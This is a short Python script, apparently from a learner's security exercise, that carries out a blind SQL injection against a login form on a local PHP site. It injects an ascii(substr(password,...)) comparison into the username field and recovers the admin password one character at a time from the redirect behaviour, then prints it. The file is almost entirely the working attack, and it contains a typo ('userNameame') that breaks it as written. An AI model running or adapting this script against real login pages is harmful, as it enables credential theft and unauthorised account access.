import requests
import string

url = "http://localhost:8088/lEARN/phpforsec/login/login_process.php"
# response = requests.get(url)
# print(response.text)

word = string.digits + string.ascii_letters + string.punctuation
removeList = "%(){}[]\'\""
words = word.translate(str.maketrans('', '', removeList))
print(words)


userName = "admin"


password = ""
iscorect = False
while not iscorect:
    for c in words:
        data = {
            "name": f"{userNameame}' AND ascii(substr(password, {len(password)} + 1, 1)) = {ord(c)} -- --", 
            "password": f"{password + c}"
        }
        r = requests.post(url, data=data)
        
        print(f"{c}", end=",")
        
        if "notSamePw" in r.url:
            password += c
            print()
            print(password)
            break
        if "index.php" in r.url:
            password += c
            print()
            print(F"{userName}의 비밀번호: {password}")
            iscorect = True
            break

    else:
        print()
        print(F"{userName}의 비밀번호: {password} 알 수 없음")
        break